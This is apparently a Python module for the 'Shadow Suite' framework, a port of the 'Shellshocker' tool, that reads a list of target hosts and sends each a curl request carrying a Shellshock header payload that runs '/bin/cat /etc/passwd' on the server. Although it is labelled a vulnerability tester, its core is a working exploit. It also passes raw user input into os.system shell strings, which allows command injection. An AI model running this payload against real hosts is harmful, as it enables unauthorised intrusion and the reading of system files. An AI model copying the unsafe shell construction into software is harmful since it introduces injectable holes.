########################################################################################
#                                                                                      #
#                             MODULE FOR SHADOW SUITE                                  #
#                                                                                      #
########################################################################################
# Coding=UTF-8

# Module version: 3.3

# Import directives
try:
    import os
    import sys
    import core.error
    import API
    # Uncomment the line above if your module will use Shadow Suite's API.

    # Place your 'import' directives below

except ImportError:
    print("[!] A module is missing! Please install the required modules...")

# Put your module information here.
info = {
        "name": "Shellshocker", # Module filename (Change this; I recommend you to use the filename as the module name.)
        "version": "2.0", # version
        "author": "NullArray", # Author
        "desc": "A bash script that tests [a list of] hosts for the shellshock vulnerability.", # Brief description
        "email": "none", # Email
        "authorinfo": "Ported to Python 3 by Catayao56", # Additional information about the author; this could be
        "lastupdate": "Mar. 05, 2018",                     # a website of the author.
        # The date format is MONTH, DD, YYYY e.g.: Jan. 4, 2018
        "usingapi": "True", # Is this module using Shadow Suite's API?
        "needsroot": "1", # Does this module needs root permissions?
                                          # 0 == True; any number means false.
}
dependencies = ['none'] # Put needed dependencies here.  

# Changelog of the module
changelog = "Version 2.0:\nPorted to Python by Catayao56\n\nVersion 1.0:\nInitial module release"
# Changelog format:
#
# changelog = "Version 2.0:\nUpdate Description\n\nVersion1.0\nInitial module release"

# Prints the module information
def module_info():
    # Unofficial way to convert integer to Boolean
    # (well, not really a boolean, as it is a string).
    # if [argument] == 0 then True; Otherwise, False.
    if info['needsroot'] == "0":
        superm = "True"
    else:
        superm = "False"

    print("Module Name: " + info['name'])
    print("Module Version: " + info['version'])
    print("Module Author: " + info['author'])
    print("Module Description: " + info['desc'])
    print()
    print("Module Author's Email: " + info['email'])
    print("Module Author's Info: " + info['authorinfo'])
    print("Module's last update: " + info['lastupdate'])
    print("Shadow Suite API Support: " + info['usingapi'])
    print("Needs root: " + superm)
    print()
    # Prints the dependencies via for loop. I just copy/pasted it from a reference book
    # and modified it XD
    print("Dependencies:", end=' ')
    for item in dependencies:
        print(item, ",", end=' ')
    print()
    # Prints the changelog of the module.
    print("Changelog:\n" + "\n" + changelog)
    print("\n\n")

# Main module function
def main():
    """ First, it checks the value assigned to the 'needsroot' variable in the 
    dictionary 'info', then if the value is equal to zero, it calls the 'geteuid()'
    function from the 'os' module. If the result from geteuid is also zero, then
    the module will call the function 'module_body()'. Otherwise, it will print an
    error message. If the value assigned to the 'needsroot' variable in the dictionary
    'info' is not equal to zero, then the module will not call the 'geteuid()' function
    from the 'os' module, and will immediately call 'module_body()' function. """
    if info['needsroot'] == "0":
        if os.geteuid() != 0:
            core.error.error0005()

        else:
            module_body()

    else:
        module_body()

def module_body():
    # Place your program here. This is the function where your program will be placed.
    # Remove module_info(), or leave it here. It's your call.
    print("Shellshocker :: Test [a list of] hosts for the shellshock vulnerability.\n")
    # cur_no_hosts is the current number of hosts entered.
    # no_of_hosts is the target number of hosts needed. (RIP Grammar)
    path_to_hosts = 'modules/shellshocker_hosts.temp'
    path_to_output = 'output'
    cur_no_hosts = 0
    no_of_hosts = input("How many hosts do you want to test? > ")
    cur_no_hosts = int(cur_no_hosts)
    no_of_hosts = int(no_of_hosts)
    while no_of_hosts != cur_no_hosts:
        TARGET = input("Target host > ")
        os.system("echo \'" + TARGET + "\' >> " + path_to_hosts)
        cur_no_hosts = cur_no_hosts + 1
    output_name = input("Output filename > ")
    output = 'output/' + output_name
    os.system("cat " + path_to_hosts + " | xargs -I % bash -c \'curl % -H \"custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" && echo ----END OF RESPONSE----\' | tee " + output)
    os.system("rm " + path_to_hosts)
    API.Class().finish()